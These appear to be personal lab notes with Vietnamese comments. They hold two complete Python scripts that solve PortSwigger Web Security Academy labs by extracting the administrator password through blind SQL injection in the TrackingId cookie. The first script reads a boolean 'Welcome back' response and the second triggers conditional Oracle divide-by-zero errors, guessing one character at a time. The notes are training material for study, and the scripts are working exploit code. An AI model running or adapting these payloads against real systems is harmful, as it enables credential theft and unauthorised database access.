

### blind
``` python
import requests
import string

# 1. Cấu hình thông tin bài Lab của bạn ở đây

url = "https://0af000b20395927e80312138007c00f9.web-security-academy.net/filter?category=Accessories" # Thay bằng URL bài lab của bạn

tracking_id = "kEP0PsqkF3vXwbBy" # Thay bằng TrackingId gốc của bạn

password_length = 20 # Thay bằng độ dài mật khẩu bạn đã tìm được

# 2. Thiết lập danh sách ký tự cần tìm kiếm (a-z, 0-9)

characters = string.ascii_lowercase + string.digits

# 3. Chuỗi nhận biết khi câu lệnh SQL trả về kết quả ĐÚNG (True)

# Ví dụ: Bài lab của PortSwigger thường hiện chữ "Welcome back" khi đúng
welcome_marker = "Welcome back!"

password = ""

print(f"[*] Bắt đầu dò tìm mật khẩu (Độ dài: {password_length})...")

# Vòng lặp chạy qua từng vị trí ký tự từ 1 đến hết độ dài mật khẩu
for position in range(1, password_length + 1):

    found = False

    for char in characters:
        # Tạo payload SQL Injection (sử dụng SUBSTRING)

        # Sử dụng dấu gạch đứng || để nối chuỗi TrackingId với payload SQL của bạn

        payload = f"{tracking_id}' AND (SELECT SUBSTRING(password, {position}, 1) FROM users WHERE username='administrator')='{char}' --"

        # Đưa payload vào Cookie giống như cách làm trên Burp Suite

        cookies = {

            "TrackingId": payload,

            "session": "3nnqiFDsQY45enBfjWEjZo2LkUPAwMcI" # Bạn có thể điền thêm session cookie nếu cần thiết

        }

        # Gửi request lên server bài lab

        try:

            response = requests.get(url, cookies=cookies, timeout=5)

            # Kiểm tra xem trang web có trả về dấu hiệu "Đúng" hay không

            if welcome_marker in response.text:

                password += char

                print(f"[+] Ký tự thứ {position}: {char} -> Mật khẩu hiện tại: {password}")

                found = True

                break # Tìm thấy ký tự đúng rồi thì dừng vòng lặp ký tự, chuyển sang vị trí tiếp theo

        except requests.exceptions.RequestException as e:

            print(f"[!] Lỗi kết nối tại vị trí {position}, ký tự '{char}': {e}")

    if not found:
        print(f"[-] Không tìm thấy ký tự phù hợp tại vị trí {position}. Có thể payload bị lỗi.")

        break

print(f"\n[🎉] Thành công! Mật khẩu hoàn chỉnh của administrator là: {password}")

```
![[Pasted image 20260629042738.png]]

### based error
```python
import requests

import string
# 1. Cấu hình thông tin bài Lab của bạn

url = "https://0afd00e403d55e44806617fe00f8007c.web-security-academy.net/filter?category=Lifestyle"

tracking_id = "84j7jmoAH4e6wh5Q"

password_length = 20 # Hãy đảm bảo bạn đã tìm chính xác độ dài mật khẩu

# 2. Thiết lập danh sách ký tự cần tìm kiếm (a-z, 0-9)

characters = string.ascii_lowercase + string.digits
password = ""
print(f"[*] Bắt đầu dò tìm mật khẩu bằng phương pháp Conditional Error (Oracle)...")
# Vòng lặp chạy qua từng vị trí ký tự của mật khẩu
for position in range(1, password_length + 1):
    found = False
    for char in characters:
        # SỬA LỖI: Dùng SUBSTR thay cho SUBSTRING và thêm phép so sánh = '{char}'
        payload = f"{tracking_id}' || (SELECT CASE WHEN SUBSTR(password, {position}, 1)='{char}' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator') --"
        cookies = {
            "TrackingId": payload,
            "session": "JPTl507E4C9C7a98FexsAXPzQWnFIMsu"
        }
        try:
            # Gửi request lên server
            response = requests.get(url, cookies=cookies, timeout=5)
            # SỬA LỖI: Kiểm tra mã lỗi trạng thái HTTP Status Code 500 từ hệ thống
            if response.status_code == 500:
                password += char
                print(f"[+] Ký tự thứ {position}: {char} -> Mật khẩu hiện tại: {password}")
                found = True
                break
        except requests.exceptions.RequestException as e:
            print(f"[!] Lỗi kết nối tại vị trí {position}, ký tự '{char}': {e}")
    if not found:
        print(f"[-] Không tìm thấy ký tự phù hợp tại vị trí {position}. Vui lòng kiểm tra lại độ dài mật khẩu hoặc session cookie.")

        break
print(f"\n[🎉] Thành công! Mật khẩu hoàn chỉnh của administrator là: {password}")
```
![[Pasted image 20260629070635.png]]
